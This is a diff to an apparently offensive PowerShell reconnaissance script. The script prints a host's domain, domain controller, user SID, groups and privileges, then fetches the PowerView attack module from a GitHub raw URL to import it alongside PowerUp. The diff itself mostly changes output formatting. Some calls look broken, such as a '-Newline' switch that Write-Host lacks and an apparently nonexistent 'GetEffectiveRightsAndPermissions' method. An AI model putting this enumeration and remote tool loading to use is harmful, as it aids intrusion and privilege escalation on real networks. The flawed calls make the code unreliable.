@@ -12,18 +12,22 @@ $groups = $windowsIdentity.Groups | ForEach-Object {$_.Translate([System.Securit
 $principal = [System.Security.Principal.WindowsPrincipal]::new($windowsIdentity)
 $privileges = $principal.GetEffectiveRightsAndPermissions('').Privileges | ForEach-Object {$_.DisplayName}
 
-Write-Host "## Computer information" -Newline
+Write-Host "`n"
+Write-Host "## Computer information"
 Write-Host "Hostname: $computerName"
 Write-Host "Local IP address: $localIP"
 Write-Host "Domain: $domain"
-Write-Host "Domain Controller: $domainController" -Newline
+Write-Host "Domain Controller: $domainController"
 
+Write-Host "`n"
 Write-Host "## User information"
 Write-Host "Current user: $userName"
 Write-Host "SID: $sid"
 Write-Host "Groups:`n$($groups -join "`n")"
 Write-Host "Privileges:`n$($privileges -join "`n")" -Newline
 
+Write-Host "`n"
+Write-Host "Importing powerview and powerup modules"
 ## Import powerview and powerup modules
 try {
     $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerView.ps1' -UseBasicParsing
